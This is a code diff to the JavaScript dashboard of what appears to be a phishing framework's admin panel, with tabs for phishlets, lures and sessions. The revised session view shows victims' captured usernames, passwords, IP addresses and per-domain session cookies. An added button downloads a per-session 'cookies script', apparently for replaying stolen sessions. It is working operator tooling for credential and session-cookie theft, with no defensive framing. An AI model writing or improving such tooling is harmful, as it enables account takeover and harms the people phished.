@@ -36,8 +36,9 @@ let credentials = [];
 // Check login status
 function checkAuthentication() {
     if (!authToken) {
-        window.location.href = '/login';
+        return Promise.reject(new Error('Not authenticated'));
     }
+    return Promise.resolve();
 }
 
 // Add authentication header to API requests
@@ -932,121 +933,117 @@ function populateSessionsTable(sessions) {
 // Show session details
 async function showSessionDetails(id) {
     // Create the popup window
-    const modal = document.createElement('div');
-    modal.className = 'modal active';
-    modal.innerHTML = `
-        <div class="modal-content modal-lg">
-            <div class="modal-header">
-                <h3>Session Details</h3>
-                <button class="modal-close">&times;</button>
-            </div>
-            <div class="modal-body">
-                <div class="session-details">
-                    <div class="loading-spinner">
-                        <div class="spinner"></div>
-                        <p style="margin-top: 10px;">Loading data...</p>
-                    </div>
-                    <div class="session-info"></div>
-                    <div class="tokens-section">
-                        <h4>Credentials and Tokens</h4>
-                        <div class="tokens-container"></div>
-                    </div>
-                </div>
-            </div>
-            <div class="modal-footer">
-                <button class="btn btn-secondary modal-close-btn">Close</button>
-            </div>
-        </div>
-    `;
-    document.body.appendChild(modal);
+    const sessionModal = document.getElementById('session-view-modal');
+    sessionModal.style.display = 'block';
     
-    // Add event listeners for closing
-    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
-    closeButtons.forEach(button => {
-        button.addEventListener('click', function() {
-            document.body.removeChild(modal);
-        });
-    });
+    const sessionIdValue = document.getElementById('session-id-value');
+    const sessionPhishletValue = document.getElementById('session-phishlet-value');
+    const sessionIpValue = document.getElementById('session-ip-value');
+    const sessionUaValue = document.getElementById('session-ua-value');
+    const sessionUsernameValue = document.getElementById('session-username-value');
+    const sessionPasswordValue = document.getElementById('session-password-value');
+    const sessionCreatedValue = document.getElementById('session-created-value');
+    const sessionUpdatedValue = document.getElementById('session-updated-value');
+    const sessionLandingValue = document.getElementById('session-landing-value');
     
-    // Fetch session details
+    // Show loading indicator
+    sessionIdValue.textContent = 'Loading...';
+    
     try {
-        const sessionDetails = await fetchSessionDetails(id);
-        const loadingSpinner = modal.querySelector('.loading-spinner');
-        loadingSpinner.style.display = 'none';
+        const sessionData = await fetchSessionDetails(id);
         
-        console.log('Session details after extraction:', sessionDetails);
+        console.log('Session data:', sessionData);
         
-        if (!sessionDetails) {
-            showToast('Error', 'Failed to fetch session details', 'error');
-            return;
-        }
+        // Populate session data
+        sessionIdValue.textContent = id;
+        sessionPhishletValue.textContent = sessionData.phishlet || 'Unknown';
+        sessionIpValue.textContent = sessionData.remote_addr || 'Unknown';
+        sessionUaValue.textContent = sessionData.useragent || 'Unknown';
+        sessionUsernameValue.textContent = sessionData.username || 'Not logged in';
+        sessionPasswordValue.textContent = sessionData.password || 'Not logged in';
+        sessionCreatedValue.textContent = formatDate(sessionData.create_time * 1000);
+        sessionUpdatedValue.textContent = formatDate(sessionData.update_time * 1000);
+        sessionLandingValue.textContent = sessionData.landing_url || 'Unknown';
         
-        // Prepare data with verification of presence
-        const sessionId = sessionDetails.id || sessionDetails.session_id || sessionDetails.SessionId || 'Unknown';
-        const phishlet = sessionDetails.phishlet || 'Unknown';
-        const username = sessionDetails.username || sessionDetails.user || sessionDetails.login || 'Not logged in';
-        const password = sessionDetails.password || sessionDetails.pass || 'Not logged in';
-        const ip = sessionDetails.remote_addr || sessionDetails.ip || sessionDetails.remote_ip || 'Unknown';
-        const userAgent = sessionDetails.user_agent || sessionDetails.useragent || sessionDetails.UserAgent || 'Not available';
-        const created = sessionDetails.created || sessionDetails.timestamp || sessionDetails.time || null;
+        // Populate cookies table
+        const cookiesTable = document.getElementById('cookies-table').querySelector('tbody');
+        cookiesTable.innerHTML = '';
         
-        // Display session information
-        const sessionInfoElement = modal.querySelector('.session-info');
-        sessionInfoElement.innerHTML = `
-            <div class="info-item">
-                <span class="info-label">Session ID:</span>
-                <span class="info-value">${sessionId}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">Phishlet:</span>
-                <span class="info-value">${phishlet}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">Username:</span>
-                <span class="info-value">${username}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">Password:</span>
-                <span class="info-value">${password}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">IP Address:</span>
-                <span class="info-value">${ip}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">User Agent:</span>
-                <span class="info-value">${userAgent}</span>
-            </div>
-            <div class="info-item">
-                <span class="info-label">Creation Time:</span>
-                <span class="info-value">${formatDate(created)}</span>
-            </div>
-        `;
-        
-        // Display tokens and data
-        const tokensContainer = modal.querySelector('.tokens-container');
-        
-        // Check for presence of tokens - they might be in any of these fields depending on data structure
-        const tokens = sessionDetails.tokens || sessionDetails.Tokens || sessionDetails.cookies || {};
-        
-        if (tokens && Object.keys(tokens).length > 0) {
-            let tokensHTML = '';
-            for (const [key, value] of Object.entries(tokens)) {
-                tokensHTML += `
-                    <div class="token-item">
-                        <div class="token-name">${key}</div>
-                        <div class="token-value">${value}</div>
-                    </div>
-                `;
+        // Check for presence of cookies
+        if (sessionData.tokens && Object.keys(sessionData.tokens).length > 0) {
+            // Convert cookies to displayable format
+            let hasAnyCookies = false;
+            
+            for (const domain in sessionData.tokens) {
+                const domainCookies = sessionData.tokens[domain];
+                
+                for (const cookieName in domainCookies) {
+                    hasAnyCookies = true;
+                    const cookie = domainCookies[cookieName];
+                    
+                    const row = document.createElement('tr');
+                    row.innerHTML = `
+                        <td>${domain}</td>
+                        <td>${cookieName}</td>
+                        <td>${cookie.value || cookie.Value || ''}</td>
+                    `;
+                    cookiesTable.appendChild(row);
+                }
             }
-            tokensContainer.innerHTML = tokensHTML;
+            
+            if (!hasAnyCookies) {
+                cookiesTable.innerHTML = '<tr><td colspan="3" class="text-center">No cookies available</td></tr>';
+            }
         } else {
-            tokensContainer.innerHTML = '<p class="no-tokens">No logged in credentials for this session</p>';
+            cookiesTable.innerHTML = '<tr><td colspan="3" class="text-center">No cookies available</td></tr>';
         }
+        
+        // Populate params table
+        const paramsTable = document.getElementById('params-table').querySelector('tbody');
+        paramsTable.innerHTML = '';
+        
+        if (sessionData.params && Object.keys(sessionData.params).length > 0) {
+            for (const paramName in sessionData.params) {
+                const paramValue = sessionData.params[paramName];
+                
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${paramName}</td>
+                    <td>${paramValue}</td>
+                `;
+                paramsTable.appendChild(row);
+            }
+        } else {
+            paramsTable.innerHTML = '<tr><td colspan="2" class="text-center">No parameters available</td></tr>';
+        }
+        
+        // Handle session delete event
+        document.getElementById('session-delete-btn').onclick = async function() {
+            if (confirm('Are you sure you want to delete this session?')) {
+                try {
+                    const response = await fetch(`/api/sessions/${id}`, {
+                        method: 'DELETE',
+                        headers: getHeaders()
+                    });
+                    
+                    if (response.ok) {
+                        showToast('Success', 'Session deleted successfully', 'success');
+                        sessionModal.style.display = 'none';
+                        fetchSessions().then(populateSessionsTable);
+                    } else {
+                        showToast('Error', 'Failed to delete session', 'error');
+                    }
+                } catch (error) {
+                    console.error('Error deleting session:', error);
+                    showToast('Error', 'Failed to delete session', 'error');
+                }
+            }
+        };
         
     } catch (error) {
-        console.error('Error in fetching session details:', error);
-        showToast('Error', 'Failed to fetch session details', 'error');
+        console.error('Error fetching session details:', error);
+        sessionIdValue.textContent = 'Error loading';
+        showToast('Error', 'Failed to load session details', 'error');
     }
 }
 
@@ -1289,68 +1286,94 @@ async function updateCertificates() {
 
 // Initialize page on load
 document.addEventListener('DOMContentLoaded', function() {
-    // Check login status
-    checkAuthentication();
-    
-    // Update data on page load
-    updateDashboard();
-    
-    // Activate default tab (dashboard)
-    document.querySelector('.sidebar-nav li:first-child a').click();
-    
-    // Add event listener for tabs
-    document.querySelectorAll('.sidebar-nav a').forEach(link => {
+    // Initialize dashboard
+    checkAuthentication()
+        .then(() => {
+            updateDashboard();
+            setupEventListeners();
+        })
+        .catch(error => {
+            console.error('Authentication error:', error);
+            // Redirect to login page if not authenticated
+            window.location.href = '/static/login.html';
+        });
+
+    // Auto refresh dashboard every 60 seconds
+    setInterval(updateDashboard, 60000);
+});
+
+// Setup event listeners for interactive elements
+function setupEventListeners() {
+    // Navigation tabs
+    const navLinks = document.querySelectorAll('.sidebar-nav a');
+    navLinks.forEach(link => {
         link.addEventListener('click', function(e) {
             e.preventDefault();
-            
-            // Remove active class from all links
-            document.querySelectorAll('.sidebar-nav a').forEach(a => {
-                a.classList.remove('active');
-            });
-            
-            // Add active class to current link
-            this.classList.add('active');
-            
-            // Hide all tab contents
-            document.querySelectorAll('.tab-content').forEach(tab => {
-                tab.style.display = 'none';
-            });
-            
-            // Show content of active tab
             const targetId = this.getAttribute('data-target');
-            const targetTab = document.getElementById(targetId);
-            if (targetTab) {
-                targetTab.style.display = 'block';
-                
-                // Update data based on active tab
-                if (targetId === 'phishlets-tab') {
-                    fetchPhishlets().then(data => populatePhishletsTable(data));
-                } else if (targetId === 'lures-tab') {
-                    fetchLures().then(data => populateLuresTable(data));
-                } else if (targetId === 'sessions-tab') {
-                    fetchSessions().then(data => populateSessionsTable(data));
-                } else if (targetId === 'dashboard-tab') {
-                    updateDashboard();
-                }
+            const tabContent = document.getElementById(targetId);
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.tab-content').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Add active class to clicked tab
+            tabContent.classList.add('active');
+            
+            // Update navigation active state
+            document.querySelectorAll('.sidebar-nav li').forEach(li => {
+                li.classList.remove('active');
+            });
+            this.parentElement.classList.add('active');
+            
+            // Special case for sessions tab - refresh data
+            if (targetId === 'sessions-tab') {
+                fetchSessions().then(populateSessionsTable);
+            }
+            // Special case for phishlets tab - refresh data
+            else if (targetId === 'phishlets-tab') {
+                fetchPhishlets().then(populatePhishletsTable);
+            }
+            // Special case for lures tab - refresh data
+            else if (targetId === 'lures-tab') {
+                fetchLures().then(populateLuresTable);
             }
         });
     });
-    
-    // Update data every 30 seconds
-    setInterval(function() {
-        // Update data based on active tab
-        const activeTab = document.querySelector('.sidebar-nav a.active');
-        if (activeTab) {
-            const targetId = activeTab.getAttribute('data-target');
-            if (targetId === 'phishlets-tab') {
-                fetchPhishlets().then(data => populatePhishletsTable(data));
-            } else if (targetId === 'lures-tab') {
-                fetchLures().then(data => populateLuresTable(data));
-            } else if (targetId === 'sessions-tab') {
-                fetchSessions().then(data => populateSessionsTable(data));
-            } else if (targetId === 'dashboard-tab') {
-                updateDashboard();
-            }
+
+    // Add event listener for download cookies button
+    document.addEventListener('click', function(e) {
+        if (e.target && e.target.id === 'download-cookies-btn') {
+            downloadCookiesScript();
         }
-    }, 30000);
-}); 
+    });
+}
+
+// Add download cookies script
+function downloadCookiesScript() {
+    const sessionIdElement = document.getElementById('session-id-value');
+    if (!sessionIdElement || !sessionIdElement.textContent) {
+        showToast('Error', 'Session ID not found', 'error');
+        return;
+    }
+    
+    const sessionId = sessionIdElement.textContent;
+    
+    // Create download link
+    const downloadUrl = `/api/sessions/${sessionId}/cookies-script`;
+    
+    // Create a dummy anchor element for download
+    const downloadLink = document.createElement('a');
+    downloadLink.href = downloadUrl;
+    downloadLink.target = '_blank';
+    downloadLink.download = `cookies_${sessionId}.js`;
+    
+    // Append the link to the document and trigger the download
+    document.body.appendChild(downloadLink);
+    downloadLink.click();
+    
+    // Remove the link from the document
+    document.body.removeChild(downloadLink);
+    
+    showToast('Success', 'Cookies script download started', 'success');
+} 
